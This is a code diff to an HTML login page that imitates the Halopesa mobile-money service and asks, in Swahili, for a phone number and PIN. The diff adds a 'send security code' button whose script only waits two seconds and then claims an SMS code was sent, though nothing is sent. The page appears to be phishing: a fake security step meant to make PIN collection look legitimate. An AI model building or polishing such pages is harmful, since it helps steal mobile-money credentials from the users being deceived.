@@ -4,7 +4,6 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
-  <!-- BLOCK TRANSLATION -->
   <meta name="google" content="notranslate">
 
   <title>Ingia - Halopesa</title>
@@ -22,7 +21,7 @@
     .box{
       background:white;
       padding:20px;
-      width:300px;
+      width:320px;
       border-radius:10px;
       box-shadow:0 0 10px rgba(0,0,0,0.1);
       text-align:center;
@@ -39,7 +38,7 @@
     .pin-box{
       display:flex;
       justify-content:space-between;
-      margin-top:10px;
+      margin-top:15px;
     }
 
     .pin-box input{
@@ -60,6 +59,22 @@
       border:none;
       border-radius:5px;
       font-size:16px;
+      cursor:pointer;
+    }
+
+    /* OTP MESSAGE */
+    .otp-message{
+      display:none;
+      font-size:14px;
+      color:#444;
+      margin-top:10px;
+    }
+
+    .loading{
+      display:none;
+      margin-top:10px;
+      font-size:14px;
+      color:#009688;
     }
   </style>
 </head>
@@ -70,9 +85,19 @@
 
   <h2>Ingia Halopesa</h2>
 
-  <input type="text" placeholder="Weka namba yako ya Halopesa">
+  <input type="text" placeholder="Weka namba yako ya Halopesa" id="phone">
 
-  <p>Weka PIN yako ya Halopesa</p>
+  <button onclick="sendOTP()">TUMA MSIMBO WA USALAMA</button>
+
+  <div class="loading" id="loading">
+    Inatuma msimbo wa SMS...
+  </div>
+
+  <div class="otp-message" id="otpMessage">
+    Msimbo umetumwa kwa SMS yako
+  </div>
+
+  <p style="margin-top:15px;">Weka PIN yako (OTP)</p>
 
   <div class="pin-box">
     <input type="password" maxlength="1">
@@ -86,27 +111,41 @@
 </div>
 
 <script>
+  // PIN AUTO MOVE
   const inputs = document.querySelectorAll(".pin-box input");
 
   inputs.forEach((input, index) => {
 
     input.addEventListener("input", () => {
-
-      if (input.value.length === 1 && index < inputs.length - 1) {
+      if (input.value && index < inputs.length - 1) {
         inputs[index + 1].focus();
       }
-
     });
 
     input.addEventListener("keydown", (e) => {
-
       if (e.key === "Backspace" && input.value === "" && index > 0) {
         inputs[index - 1].focus();
       }
-
     });
 
   });
+
+  // OTP EFFECT
+  function sendOTP() {
+
+    document.getElementById("loading").style.display = "block";
+
+    document.getElementById("otpMessage").style.display = "none";
+
+    setTimeout(() => {
+
+      document.getElementById("loading").style.display = "none";
+
+      document.getElementById("otpMessage").style.display = "block";
+
+    }, 2000);
+
+  }
 </script>
 
 </body>
